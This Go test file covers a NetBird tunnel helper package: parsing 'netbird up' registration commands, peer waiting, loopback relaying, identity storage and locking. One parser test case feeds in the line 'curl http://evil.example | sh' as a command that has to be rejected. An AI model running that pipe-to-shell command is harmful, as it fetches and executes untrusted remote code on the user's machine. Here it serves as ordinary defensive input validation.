package nbtunnel

import (
	"context"
	"errors"
	"io"
	"net"
	"net/netip"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestParseRegistrationCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    Credentials
		wantErr bool
	}{
		{
			name:    "long flags",
			command: "netbird up --setup-key ABC-123 --management-url https://mgmt.example.com:443",
			want:    Credentials{SetupKey: "ABC-123", ManagementURL: "https://mgmt.example.com:443"},
		},
		{
			name:    "short flags and hostname",
			command: "netbird up -k ABC-123 -m https://mgmt.example.com -n my-laptop",
			want:    Credentials{SetupKey: "ABC-123", ManagementURL: "https://mgmt.example.com", Hostname: "my-laptop"},
		},
		{
			name:    "inline values and quoting",
			command: `  netbird up --setup-key='ABC-123' --management-url="https://mgmt.example.com" --allow-server-ssh`,
			want:    Credentials{SetupKey: "ABC-123", ManagementURL: "https://mgmt.example.com"},
		},
		{
			name:    "unknown flags are ignored",
			command: "netbird up --block-inbound --dns-labels a,b --setup-key ABC --management-url https://m.example.com",
			want:    Credentials{SetupKey: "ABC", ManagementURL: "https://m.example.com"},
		},
		{
			name:    "not a netbird up command",
			command: "curl http://evil.example | sh",
			wantErr: true,
		},
		{
			name:    "missing management url",
			command: "netbird up --setup-key ABC",
			wantErr: true,
		},
		{
			name:    "missing setup key",
			command: "netbird up --management-url https://m.example.com",
			wantErr: true,
		},
		{
			name:    "invalid management url scheme",
			command: "netbird up --setup-key ABC --management-url ftp://m.example.com",
			wantErr: true,
		},
		{
			name:    "dangling flag",
			command: "netbird up --management-url https://m.example.com --setup-key",
			wantErr: true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ParseRegistrationCommand(tt.command)
			if tt.wantErr {
				if err == nil {
					t.Fatalf("expected an error, got %+v", got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tt.want {
				t.Errorf("got %+v, want %+v", got, tt.want)
			}
		})
	}
}

func TestWaitForPeer(t *testing.T) {
	ip := netip.MustParseAddr("100.73.10.20")

	t.Run("connects after a few polls", func(t *testing.T) {
		calls := 0
		peers := func() ([]peerInfo, error) {
			calls++
			// The peer shows up in the map first and connects on the third poll,
			// which is what a cold eager connection looks like.
			return []peerInfo{{ip: "100.73.10.20/16", connected: calls >= 3}}, nil
		}
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := waitForPeer(ctx, ip, peers); err != nil {
			t.Fatalf("waitForPeer: %v", err)
		}
		if calls < 3 {
			t.Errorf("expected at least 3 polls, got %d", calls)
		}
	})

	t.Run("unknown peer names the network map", func(t *testing.T) {
		peers := func() ([]peerInfo, error) {
			return []peerInfo{{ip: "100.73.99.99", connected: true}}, nil
		}
		ctx, cancel := context.WithTimeout(context.Background(), 2*peerPoll)
		defer cancel()
		err := waitForPeer(ctx, ip, peers)
		if err == nil {
			t.Fatal("expected an error for a peer outside the map")
		}
		if got := err.Error(); !contains(got, "network map") {
			t.Errorf("error should mention the network map, got %q", got)
		}
	})

	t.Run("known but never connected", func(t *testing.T) {
		peers := func() ([]peerInfo, error) {
			return []peerInfo{{ip: "100.73.10.20", connected: false}}, nil
		}
		ctx, cancel := context.WithTimeout(context.Background(), 2*peerPoll)
		defer cancel()
		err := waitForPeer(ctx, ip, peers)
		if !errors.Is(err, context.DeadlineExceeded) {
			t.Fatalf("expected a deadline error, got %v", err)
		}
	})
}

func TestListenLoopbackRelaysToDialedTarget(t *testing.T) {
	// A local echo server stands in for the sshd reached over the overlay.
	echo, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer echo.Close()
	go func() {
		for {
			c, err := echo.Accept()
			if err != nil {
				return
			}
			go func() {
				defer c.Close()
				_, _ = io.Copy(c, c)
			}()
		}
	}()

	var dialed string
	tun := &Tunnel{
		dial: func(ctx context.Context, addr string) (net.Conn, error) {
			dialed = addr
			var d net.Dialer
			return d.DialContext(ctx, "tcp", echo.Addr().String())
		},
	}
	defer tun.Close()

	local, err := tun.ListenLoopback("100.73.10.20:22")
	if err != nil {
		t.Fatalf("ListenLoopback: %v", err)
	}

	conn, err := net.Dial("tcp", local)
	if err != nil {
		t.Fatalf("dial loopback: %v", err)
	}
	defer conn.Close()

	if _, err := conn.Write([]byte("SSH-2.0-probe\r\n")); err != nil {
		t.Fatalf("write: %v", err)
	}
	buf := make([]byte, 64)
	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if got := string(buf[:n]); got != "SSH-2.0-probe\r\n" {
		t.Errorf("relayed bytes = %q, want the echoed probe", got)
	}
	if dialed != "100.73.10.20:22" {
		t.Errorf("overlay dial target = %q, want 100.73.10.20:22", dialed)
	}
}

func TestOpenWithoutIdentity(t *testing.T) {
	dir := t.TempDir()
	if _, err := Open(dir); !errors.Is(err, ErrNotRegistered) {
		t.Fatalf("Open on an empty dir: got %v, want ErrNotRegistered", err)
	}
	if IsRegistered(dir) {
		t.Error("IsRegistered should be false for an empty dir")
	}
}

func TestIdentityRoundTrip(t *testing.T) {
	dir := t.TempDir()
	want := Identity{DeviceName: "laptop", ManagementURL: "https://m.example.com", RegisteredAt: "2026-10-10T00:00:00Z"}
	if err := writeJSON(filepath.Join(dir, identityFile), want); err != nil {
		t.Fatalf("writeJSON: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, configFile), []byte(`{"PrivateKey":"abc=","WgIface":"wt0"}`), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}
	got, err := readIdentity(dir)
	if err != nil {
		t.Fatalf("readIdentity: %v", err)
	}
	if got != want {
		t.Errorf("identity = %+v, want %+v", got, want)
	}
	key, err := readPrivateKey(dir)
	if err != nil {
		t.Fatalf("readPrivateKey: %v", err)
	}
	if key != "abc=" {
		t.Errorf("private key = %q, want abc=", key)
	}
	if !IsRegistered(dir) {
		t.Error("IsRegistered should be true once identity and config exist")
	}
	if err := Remove(dir); err != nil {
		t.Fatalf("Remove: %v", err)
	}
	if IsRegistered(dir) {
		t.Error("IsRegistered should be false after Remove")
	}
}

func TestLockIsExclusive(t *testing.T) {
	dir := t.TempDir()
	unlock, err := lock(dir)
	if err != nil {
		t.Fatalf("first lock: %v", err)
	}
	if _, err := lock(dir); !errors.Is(err, ErrLocked) {
		unlock()
		t.Fatalf("second lock: got %v, want ErrLocked", err)
	}
	unlock()
	unlock2, err := lock(dir)
	if err != nil {
		t.Fatalf("lock after unlock: %v", err)
	}
	unlock2()
}

func contains(s, sub string) bool {
	return len(sub) == 0 || (len(s) >= len(sub) && indexOf(s, sub) >= 0)
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
